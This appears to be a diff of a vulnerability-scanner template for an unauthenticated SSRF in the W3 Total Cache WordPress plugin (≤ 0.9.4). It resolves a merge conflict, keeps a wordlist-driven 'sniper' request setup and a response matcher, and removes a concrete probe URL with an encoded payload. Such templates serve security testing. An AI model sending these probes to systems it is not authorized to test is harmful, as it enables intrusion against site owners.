@@ -1,24 +1,15 @@
 id: w3c-total-cache-ssrf
-
 info:
-  name: Wordpress W3C Total Cache <= 0.9.4 - Server Side Request Forgery (SSRF)
+  name: Wordpress W3C Total Cache SSRF <= 0.9.4
   author: random_robbie
   severity: medium
-<<<<<<< HEAD
   tags: wordpress,wp-plugin
   description: The W3 Total Cache WordPress plugin was affected by an Unauthenticated Server Side Request Forgery (SSRF) security vulnerability.
   reference: |
-=======
-  description: |
-    The W3 Total Cache WordPress plugin was affected by an Unauthenticated Server Side Request Forgery (SSRF) security vulnerability.
-  reference:
->>>>>>> 5d36d276 (add new stuff)
     - https://wpvulndb.com/vulnerabilities/8644
     - https://klikki.fi/adv/w3_total_cache.html
-  tags: wordpress,wp-plugin,cache,ssrf,wp
 
 requests:
-<<<<<<< HEAD
   - payloads:
       Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
     attack: sniper
@@ -31,18 +22,8 @@ requests:
         User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
         Accept-Encoding: gzip, deflate
         Accept: */*
-=======
-  - method: GET
-    path:
-      - '{{BaseURL}}/wp-content/plugins/w3-total-cache/pub/minify.php?file=yygpKbDS1y9Ky9TLSy0uLi3Wyy9KB3NLKkqUM4CyxUDpxKzECr30_Pz0nNTEgsxiveT8XAA.css'
-
->>>>>>> 5d36d276 (add new stuff)
     matchers:
       - type: word
-        part: body
         words:
           - "NessusFileIncludeTest"
-<<<<<<< HEAD
         part: body
-=======
->>>>>>> 5d36d276 (add new stuff)
